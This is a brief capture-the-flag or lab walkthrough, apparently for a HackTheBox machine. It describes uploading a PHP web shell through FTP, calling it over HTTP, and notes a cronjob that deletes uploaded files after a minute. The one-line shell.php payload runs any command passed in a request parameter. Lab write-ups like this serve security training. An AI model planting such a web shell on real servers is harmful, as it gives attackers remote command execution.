# Getting a Shell

### Upload a shell to ftp and access the file on http://dev.sneakycorp.htb/file
content of shell.php
```php
$ cat shell.php 
<?php system($_REQUEST["eris"]); ?>
```

![[Pasted image 20211214003013.png]]

![[Pasted image 20211214003023.png]]


ftp has a cronjob to delete the file we upload after 1 minute
![[Pasted image 20211214003306.png]]

![[Pasted image 20211214003321.png]]